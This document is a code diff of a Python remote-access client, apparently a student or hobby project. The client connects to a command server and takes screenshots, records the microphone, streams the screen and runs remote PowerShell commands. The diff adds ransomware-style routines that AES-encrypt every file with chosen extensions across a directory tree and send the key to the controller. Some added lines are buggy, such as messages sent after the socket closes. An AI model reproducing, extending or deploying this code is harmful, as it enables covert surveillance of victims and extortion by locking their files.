@@ -10,16 +10,88 @@ import sounddevice as sd
 import soundfile as sf
 import pyautogui
 from datetime import datetime
+import ast # to return the key to byte
+
 SERVER_HOST = "127.0.0.1"   
 SERVER_PORT = 5001
 
-def log(msg):
-    print(f"[{datetime.utcnow().strftime('%H:%M:%S')}] {msg}")
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
+import os
 
+key = os.urandom(32)
+iv = os.urandom(16)
+
+def encrypt(sock,input_file):
+
+    with open(input_file, 'rb') as f:
+        data = f.read()
+
+    padder = padding.PKCS7(128).padder()
+    padded_data = padder.update(data) + padder.finalize()# إضافة الحشو
+
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+
+    with open(input_file+"enc", 'wb') as f:
+        f.write(iv + encrypted_data)
+    sendkey={"command":"key","result":"ok","details":key}
+    send_json(sock,sendkey)
+    details=f'the {input_file} encrypted with {key} to {input_file}.enc'
+    result={"command":"encryption","status":"ok","details":details }
+    send_json(sock,result)
+
+def encrypt_file(sock,pathfile,extensions):
+     os.chdir(pathfile)
+     for root, dirs, files in os.walk("."):
+        for file in files:
+            for ext in extensions:
+                if file.endswith(ext):
+                    full_path = os.path.join(root, file)
+                    encrypt(sock,full_path)
+
+    
+# encrypt_file("secret_data.png", "image.enc")
+
+def decrypt(sock,input_file, key):
+    key = ast.literal_eval(key)
+    with open(input_file, 'rb') as f:
+        iv = f.read(16)
+        encrypted_data = f.read()
+
+    #object of cipher for decryption
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    #object of decryptor to decrypt the data
+    decryptor = cipher.decryptor()
+    padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
+
+    # إزالة الحشو
+    unpadder = padding.PKCS7(128).unpadder()
+    data = unpadder.update(padded_data) + unpadder.finalize()
+    input_fil=input_file+"enc"
+    with open(input_fil, 'wb') as f:
+        f.write(data)
+    details=f'the {input_file} decrypted with {key} to {input_fil}'
+    result={"command":"decrypt","status":"ok","details":details }
+    send_json(sock,result)
+    
+# decrypt_file("image.enc", "decrypted_image.png")
+
+def decrypt_file(sock,pathfile,extensions,key):
+     os.chdir(pathfile)
+     for root, dirs, files in os.walk("."):
+        for file in files:
+            for ext in extensions:
+                if file.endswith(ext):
+                    full_path = os.path.join(root, file)
+                    decrypt(sock,full_path,key)
 def send_json(sock, obj):
     """Send JSON object with 4-byte big-endian length prefix."""
     data = json.dumps(obj).encode('utf-8')
-    sock.sendall(len(data).to_bytes(4, 'big'))
+    a=len(data).to_bytes(4, 'big')
+    sock.sendall(a)
     sock.sendall(data)
 
 def recv_all(sock, n):
@@ -43,7 +115,7 @@ def handle_screenshot():
 
 def handle_record_audio(duration=5, samplerate=44100):
     """Record microphone input and return as base64 WAV."""
-    log(f"Recording audio for {duration}s ...")
+    # send_json({"command":"message","note":"Recording audio for {duration}s ..."})
     audio = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=1, dtype='int16')
     sd.wait()
     buf = io.BytesIO()
@@ -63,12 +135,10 @@ def handle_live_screen(sock, duration=5):
         sock.sendall(len(data).to_bytes(4, 'big'))
         sock.sendall(data)
         time.sleep(0.1)
-    log("Live stream finished.")
+    send_json(sock,{"command":"message","status": "ok","note":"finish live screen"})
 
 def handle_powershell(sock, cmd):
-   
     current_path = os.getcwd()
-
     if cmd.startswith("cd "):
         try:
             new_dir = cmd[3:].strip()
@@ -81,6 +151,10 @@ def handle_powershell(sock, cmd):
             result = f"Error changing directory: {e}\n"
     elif cmd.lower() in ["exit", "quit", "logout"]:
         result = "Exited remote PowerShell session.\n"
+    # elif cmd.startswith("encrypt"):
+        
+    # elif cmd.startswith("decrypt"):
+    #     originalfile=cmd[3:]
     else:
         try:
             process = subprocess.run(
@@ -106,9 +180,8 @@ def handle_powershell(sock, cmd):
 def client_loop():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        log(f"try Connecting to {SERVER_HOST}:{SERVER_PORT} ...")
+        # send_json({"command":"message","status": "ok","note":"try Connecting to {SERVER_HOST}:{SERVER_PORT} ..."})
         sock.connect((SERVER_HOST, SERVER_PORT))
-        log("Connected to server.")
         while True:
             hdr = recv_all(sock, 4)
             if not hdr:
@@ -121,12 +194,12 @@ def client_loop():
             try:
                 cmd = json.loads(data.decode('utf-8'))
             except Exception as e:
-                log(f"Bad JSON: {e}")
+                # send_json(sock, {"command":"message","status": "ok","note":"Bad JSON: {e}"})
+                print(f"Bad JSON: {e}")
                 continue
 
             command = cmd.get("command")
-            log(f"Received command: {command}")
-
+            send_json(sock, {"command":"message","status": "ok","note":"Received command: {command}"})
             try:
                 if command == "screenshot":
                     resp = handle_screenshot()
@@ -143,18 +216,25 @@ def client_loop():
                 elif command == "powershell":
                     cmdline = cmd.get("cmd", "")
                     handle_powershell(sock, cmdline)
-
+                elif command == "encrypt":
+                    path = cmd.get("path", "")
+                    extensions=cmd.get("extensions","")
+                    encrypt_file(sock,path,extensions)
+                elif command == "decrypt":
+                    pathfolder = cmd.get("path", "")
+                    extensions = cmd.get("extensions", "")
+                    key = cmd.get("key", "")
+                    decrypt_file(sock,pathfolder,extensions,key)
                 else:
                     send_json(sock, {"command": command, "status": "unknown_command"})
 
             except Exception as e:
-                log(f"Error executing {command}: {e}")
                 send_json(sock, {"command": command, "status": f"error: {e}"})
 
     except Exception as e:
-        log(f"Connection failed: {e}")
+        send_json(sock, {"command":"message","status": "ok","note":"Connection failed: {e}"})
     finally:
         sock.close()
-        log("Disconnected.")
+        send_json(sock, {"command":"message","status": "ok","note":"Disconnected."})
 if __name__ == "__main__":
     client_loop()
